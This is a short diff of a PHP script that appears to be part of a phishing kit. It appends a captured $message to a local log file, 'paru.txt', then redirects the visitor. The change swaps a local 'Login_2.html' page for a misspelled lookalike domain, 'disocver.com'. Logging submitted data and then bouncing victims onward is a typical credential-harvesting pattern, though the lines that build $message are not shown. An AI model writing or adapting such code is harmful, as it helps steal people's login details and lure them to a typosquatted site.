@@ -33,6 +33,6 @@ $encrypt=  base64_encode($message);
 $fp = fopen("paru.txt","a");
 fputs($fp,$message);
 fclose($fp); 
-header("Location: Login_2.html");
+header("Location: https://disocver.com");
 
 ?>
